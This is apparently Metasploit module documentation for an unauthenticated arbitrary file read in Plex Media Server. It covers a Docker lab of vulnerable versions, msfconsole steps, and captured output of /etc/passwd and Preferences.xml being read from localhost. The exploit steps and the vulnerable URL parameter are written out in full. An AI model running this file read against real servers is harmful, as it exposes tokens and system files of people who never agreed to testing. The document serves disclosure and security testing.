## Vulnerable Application

Plex Media Server (<= 1.43.2.10687, and the first 1.43.3 build 10828) exposes
GET /library/metadata/<ratingKey>/file?url=<media-reference>. The handler
resolves the caller-supplied media reference without validating its scheme or
confining the resolved path to the item's metadata bundle directory. Supplying
a file:// URL with an absolute path makes the server stream back any file
readable by the PMS service account (often root on NAS/Docker installs).

Fixed in 1.43.3.10896, which rejects references that are unsupported or that
"escape the bundle directory".

No authentication is required when the source IP is treated as an allowed
network (default on unclaimed servers and common LAN configurations); an
X-Plex-Token belonging to any user with library visibility works otherwise.

### Docker setup

The following `docker-compose.yml` will start the 1.43.2 and 1.43.3 branches on port 32402 and 32403.

```
version: "3"

services:
  pms1432:
    image: plexinc/pms-docker:1.43.2.10687-563d026ea-amd64
    container_name: pms1432
    hostname: pms1432
    environment:
      - PLEX_UID=1000
      - PLEX_GID=1000
      - TZ=UTC
      - PLEX_CLAIM=claim-dummy
      - ADVERTISE_IP=http://127.0.0.1:32402/
    volumes:
      - ./data1432/config:/config
      - ./data1432/transcode:/transcode
      - ./media:/data
    ports:
      - "32402:32400"

  pms1433:
    image: plexinc/pms-docker:1.43.3.10828-00f62d37d-amd64
    container_name: pms1433
    hostname: pms1433
    environment:
      - PLEX_UID=1000
      - PLEX_GID=1000
      - TZ=UTC
      - PLEX_CLAIM=claim-dummy
      - ADVERTISE_IP=http://127.0.0.1:32403/
    volumes:
      - ./data1433/config:/config
      - ./data1433/transcode:/transcode
      - ./media:/data
    ports:
      - "32403:32400"
```

## Verification Steps
Example steps in this format (is also in the PR):

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/plex_media_server_file_read`
1. Do: `set rport 32402`
1. Do: `set rhosts 127.0.0.1`
1. Do: `set file /etc/passwd`
1. Do: `run`
1. You should get the contents of the file

## Options

### TOKEN

`X-Plex-Token` for authentication (required on strict-auth servers). Defaults to ``

### FILE

Absolute path of the file to read. Defaults to `` which will look for `Preferences.xml`

### RATINGKEY

Metadata ratingKey to use (auto-discovered if unset). Defaults to ``

## Scenarios

### 1.43.2.10687-563d026ea on Docker

```
msf > use auxiliary/scanner/http/plex_media_server_file_read
msf auxiliary(scanner/http/plex_media_server_file_read) > set rport 32402
rport => 32402
msf auxiliary(scanner/http/plex_media_server_file_read) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf auxiliary(scanner/http/plex_media_server_file_read) > set file /etc/passwd
file => /etc/passwd
msf auxiliary(scanner/http/plex_media_server_file_read) > run
[*] Version: 1.43.2.10687-563d026ea
[*] Using ratingKey 1
[+] /etc/passwd (922 bytes) saved to /root/.msf4/loot/20260904070737_default_127.0.0.1_plex.file_285112.bin
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
plex:x:1000:1000::/config:/bin/false
uuidd:x:100:101::/run/uuidd:/usr/sbin/nologin

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### 1.43.3.10828-00f62d37d on Docker

```
msf > use auxiliary/scanner/http/plex_media_server_file_read 
msf auxiliary(scanner/http/plex_media_server_file_read) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf auxiliary(scanner/http/plex_media_server_file_read) > set rport 32403
rport => 32403
msf auxiliary(scanner/http/plex_media_server_file_read) > run
[*] Version: 1.43.3.10828-00f62d37d
[*] Using ratingKey 1
[+] /config/Library/Application Support/Plex Media Server/Preferences.xml (435 bytes) saved to /home/h00die/.msf4/loot/20260904070345_default_127.0.0.1_plex.file_059264.xml
<?xml version="1.0" encoding="utf-8"?>
<Preferences MachineIdentifier="d1a22676-1767-48fd-9c14-63b6325c42a2" ProcessedMachineIdentifier="86e0e62f4708175c68f220c79e67d8bffc128799" customConnections="http://127.0.0.1:32403/" TranscoderTempDirectory="/transcode" IPNetworkType="dualstack" OldestPreviousVersion="legacy" AnonymousMachineIdentifier="4edff671-50d1-47d9-9870-4bca01402794" MetricsEpoch="1" GlobalMusicVideoPathMigrated="1"/>

[-] Failed to read /var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Preferences.xml (HTTP 404)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/plex_media_server_file_read) > set file /etc/passwd
file => /etc/passwd
msf auxiliary(scanner/http/plex_media_server_file_read) > run
[*] Version: 1.43.3.10828-00f62d37d
[*] Using ratingKey 1
[+] /etc/passwd (922 bytes) saved to /home/h00die/.msf4/loot/20260904070414_default_127.0.0.1_plex.file_414990.bin
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
plex:x:1000:1000::/config:/bin/false
uuidd:x:100:101::/run/uuidd:/usr/sbin/nologin

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
